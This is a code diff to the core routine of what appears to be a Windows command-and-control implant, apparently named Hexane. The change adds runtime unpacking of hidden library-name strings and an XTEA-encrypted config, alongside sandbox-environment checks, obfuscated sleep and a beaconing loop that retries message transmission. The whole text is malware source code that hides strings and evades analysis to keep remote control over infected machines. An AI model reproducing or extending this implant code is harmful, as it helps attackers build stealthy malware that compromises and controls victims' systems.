@@ -5,40 +5,40 @@ using namespace Parser;
 using namespace Random;
 using namespace Xtea;
 
-CFG_SECTION BYTE Config[256] = { CONFIG_BYTES };
-namespace Core {
+TXT_SECTION(F) BYTE Config[512] = { 0x00 };
+TXT_SECTION(G) BYTE Strings[256] = { 0x00 };
 
-    VOID MainRoutine () {
+namespace Core {
+    VOID MainRoutine() {
         HEXANE
 
         ResolveApi();
-        SeCheckEnvironment();
+        if (ntstatus != ERROR_SUCCESS) {
+            return_defer(ntstatus);
+        }
 
+        SeCheckEnvironment();
         if (ntstatus == ERROR_BAD_ENVIRONMENT) {
             return_defer(ntstatus);
         }
 
-        if (Ctx) {
-            do {
-                SleepObf();
-                if (!CheckTime()) {
-                    return_defer(ERROR_NOT_READY);
-                }
-
-                MessageTransmit();
-                if (ntstatus != ERROR_SUCCESS) {
-                    Ctx->Session.Retry++;
-
-                    if (Ctx->Session.Retry == 3) {
-                        break;
-                    }
-                }
-                else {
-                    Ctx->Session.Retry = 0;
-                }
+        do {
+            SleepObf();
+            if (!CheckTime()) {
+                return_defer(ERROR_NOT_READY);
             }
-            while (TRUE);
-        }
+
+            MessageTransmit();
+            if (ntstatus != ERROR_SUCCESS) {
+                Ctx->Session.Retry++;
+
+                if (Ctx->Session.Retry == 3) {
+                    break;
+                }
+            } else {
+                Ctx->Session.Retry = 0;
+            }
+        } while (TRUE);
 
     defer:
         FreeApi(Ctx);
@@ -47,10 +47,14 @@ namespace Core {
     VOID ResolveApi () {
         HEXANE
 
-        UCHAR crypt32[24]   = { CRYPT32 };
-        UCHAR winhttp[24]   = { WINHTTP };
-        UCHAR advapi32[24]  = { ADVAPI32 };
-        UCHAR iphlpapi[24]  = { IPHLPAPI };
+        //UCHAR crypt32[24]   = { CRYPT32 };
+        //UCHAR winhttp[24]   = { WINHTTP };
+        //UCHAR advapi32[24]  = { ADVAPI32 };
+        //UCHAR iphlpapi[24]  = { IPHLPAPI };
+
+        PARSER Parser = { };
+        CreateParser(&Parser, Strings, 256);
+        x_memset(Strings, 0, 256);
 
         ULONG KERNEL32              = { };
         OSVERSIONINFOW OSVersionW   = { };
@@ -202,10 +206,10 @@ namespace Core {
 
         if ((FPTR(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
             if (
-                !(Ctx->Modules.crypt32 = Ctx->win32.LoadLibraryA((LPCSTR)crypt32)) ||
-                !(Ctx->Modules.winhttp = Ctx->win32.LoadLibraryA((LPCSTR)winhttp)) ||
-                !(Ctx->Modules.advapi  = Ctx->win32.LoadLibraryA((LPCSTR)advapi32)) ||
-                !(Ctx->Modules.iphl    = Ctx->win32.LoadLibraryA((LPCSTR)iphlpapi))) {
+                !(Ctx->Modules.crypt32 = Ctx->win32.LoadLibraryA(UnpackString(&Parser, nullptr))) ||
+                !(Ctx->Modules.winhttp = Ctx->win32.LoadLibraryA(UnpackString(&Parser, nullptr))) ||
+                !(Ctx->Modules.advapi  = Ctx->win32.LoadLibraryA(UnpackString(&Parser, nullptr))) ||
+                !(Ctx->Modules.iphl    = Ctx->win32.LoadLibraryA(UnpackString(&Parser, nullptr)))) {
                 return_defer(ERROR_MOD_NOT_FOUND);
             }
         } else {
@@ -259,7 +263,7 @@ namespace Core {
         Ctx->LE = TRUE;
 
         CreateParser(&Parser, Config, sizeof(Config));
-        x_memset(Config, 0, sizeof(Config));
+        x_memset(Config, 0, 512);
 
         XteaCrypt(B_PTR(Parser.Handle), Parser.Length, InitKey, FALSE);
 
